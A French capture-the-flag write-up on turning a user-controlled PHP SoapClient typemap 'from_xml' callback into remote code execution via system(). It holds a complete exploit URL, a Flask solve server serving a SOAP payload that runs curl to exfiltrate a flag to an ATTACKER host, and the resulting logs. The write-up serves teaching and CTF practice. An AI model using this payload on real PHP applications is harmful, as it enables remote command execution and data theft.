# Soaperlipopette - Writeup

## Analyse du challenge

Le challenge fournit un unique fichier PHP :

```php
<?php new SoapClient($_GET[0] ?? null, $_GET[1] ?? null)->bzh();
```

Une seule ligne. Un `SoapClient` est instancié avec deux paramètres entièrement contrôlés par l'utilisateur via `$_GET`, puis une méthode `->bzh()` est appelée dessus.

> ⚠️ L'opérateur `??` (null coalescing) ne retombe sur `null` **que si la clé est absente ou vaut `null`**. Une chaîne vide `""` reste `""`. Pour rester en mode non-WSDL, il faut donc **ne pas envoyer du tout** le paramètre `0` dans la query string (pas même `?0=`).

## Comprendre SoapClient

La classe [`SoapClient`](https://www.php.net/manual/fr/soapclient.construct.php) est le client SOAP natif de PHP. Son constructeur accepte deux arguments :

```php
public SoapClient::__construct(?string $wsdl, array $options = [])
```

- **`$wsdl`** : URL d'un fichier WSDL, ou **`null`** pour le mode non-WSDL
- **`$options`** : tableau d'options de configuration

### Le mode non-WSDL

Quand `$wsdl` est `null`, le client fonctionne en mode **non-WSDL**. Il ne valide aucun schéma et fait confiance aux options fournies. Deux options deviennent alors obligatoires :
- **`location`** : l'URL du serveur SOAP à contacter
- **`uri`** : le namespace du service

### L'option `typemap`

La [documentation PHP](https://www.php.net/manual/fr/soapclient.construct.php) décrit l'option `typemap` comme un tableau permettant de définir des callbacks personnalisés pour la (dé)sérialisation de types XML :

```php
'typemap' => [
    [
        'type_ns'   => 'namespace_xml',
        'type_name' => 'nom_du_type',
        'from_xml'  => 'callback_de_deserialisation'
    ]
]
```

Le callback `from_xml` est appelé lorsque PHP rencontre un noeud XML dont le namespace et le type correspondent à `type_ns` et `type_name`.

### Que se passe-t-il dans le code source de PHP ?

Dans le code C de PHP, l'option `from_xml` est extraite dans [`ext/soap/soap.c`](https://github.com/php/php-src/blob/master/ext/soap/soap.c#L843-L844) :

```c
} else if (zend_string_equals_literal(name, "from_xml")) {
    to_zval = tmp;
}
```

Le callback est ensuite câblé dans l'encodeur ([`soap.c#L885-L887`](https://github.com/php/php-src/blob/master/ext/soap/soap.c#L885-L887)) :

```c
if (to_zval) {
    ZVAL_COPY(&new_enc->details.map->to_zval, to_zval);
    new_enc->to_zval = to_zval_user;
}
```

Lors de la désérialisation de la réponse XML, la fonction [`to_zval_user()`](https://github.com/php/php-src/blob/master/ext/soap/php_encoding.c#L610-L634) est invoquée :

```c
zval *to_zval_user(zval *ret, encodeTypePtr type, xmlNodePtr node)
{
    // ...
    copy = xmlCopyNode(node, 1);
    buf = xmlBufferCreate();
    xmlNodeDump(buf, NULL, copy, 0, 0);
    ZVAL_STRING(&data, (char*)xmlBufferContent(buf));
    // ...
    call_user_function(NULL, NULL, &type->map->to_zval, ret, 1, &data);
}
```

Le noeud XML est sérialisé en **chaîne brute**, puis passé comme unique argument au callback via `call_user_function()`. PHP ne vérifie à aucun moment que le callback est sûr — il appelle directement la fonction dont le nom est fourni par l'utilisateur.

## Exploitation

### Le vecteur d'attaque

Si `from_xml` vaut `system`, alors `system()` est appelée avec le contenu XML brut du noeud. L'attaquant contrôle :
1. **Le callback** (`from_xml=system`) via les paramètres GET
2. **L'input du callback** via la réponse XML servie par son serveur (`location`)

### Construction de l'URL

```
/?bzh=1&1[location]=http://ATTACKER:5000/rce.xml&1[uri]=x&1[typemap][0][type_ns]=rce_xmlns&1[typemap][0][type_name]=evil&1[typemap][0][from_xml]=system
```

- `bzh=1` → passe le gate d'entrée de `index.php`
- paramètre `0` **omis** → `$_GET[0]` absent → `?? null` retourne `null` → mode non-WSDL
- `1[location]` → pointe vers le serveur de l'attaquant
- `1[typemap][0][from_xml]=system` → le callback de désérialisation est `system()`

### Le serveur malveillant (solve.py)

```python
from flask import Flask, request, Response

app = Flask(__name__)

@app.route("/rce.xml", methods=["GET", "POST"])
def poc_xml():
    xml = """
<e:Envelope xmlns:e="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:a="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:rce_xmlns="rce_xmlns">
  <e:Body>
    <rce_xmlns:a>
      <evil a:type="rce_xmlns:evil">rce;curl http://ATTACKER:5000/?flag=$(/getflag|base64);
      </evil>
    </rce_xmlns:a>
  </e:Body>
</e:Envelope>""".strip()
    return Response(xml, status=200, mimetype="application/xml")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

Quand PHP désérialise la réponse, il rencontre `<evil a:type="rce_xmlns:evil">` :
- Le namespace `rce_xmlns` matche `type_ns`
- Le type `evil` matche `type_name`
- → PHP appelle `system()` avec le noeud XML brut

`system()` reçoit :
```
<evil xmlns:a="..." a:type="rce_xmlns:evil">rce;curl http://ATTACKER:5000/?flag=$(/getflag|base64);
</evil>
```

Le shell interprète cette chaîne :
1. `<evil xmlns:a="..." a:type="rce_xmlns:evil">rce` → erreur (ignorée)
2. `;curl http://ATTACKER:5000/?flag=$(/getflag|base64);` → **exécuté**
3. `\n      </evil>` → erreur sur la ligne suivante (le curl a déjà tourné)

Le retour à la ligne avant `</evil>` est **essentiel** : il permet au shell d'exécuter la première ligne avant de parser la seconde. Sans ce retour à la ligne, le `</evil>` cause une erreur de syntaxe (`>` sans argument après une redirection) qui empêche l'exécution de toute la ligne, y compris le `curl`.

### Résultat

Le flag est exfiltré en base64 dans les logs du serveur Flask :

```bash
172.20.0.2 - - "POST /rce.xml HTTP/1.1" 200 -
172.20.0.2 - - "GET /?flag=QlpIQ1RGe1NvYXBDbGllbnRPYmplY3RJbmplY3Rpb259Cg== HTTP/1.1" 200 -
```

```bash
$ echo QlpIQ1RGe1NvYXBDbGllbnRPYmplY3RJbmplY3Rpb259Cg== | base64 -d
BZHCTF{SoapClientObjectInjection}
```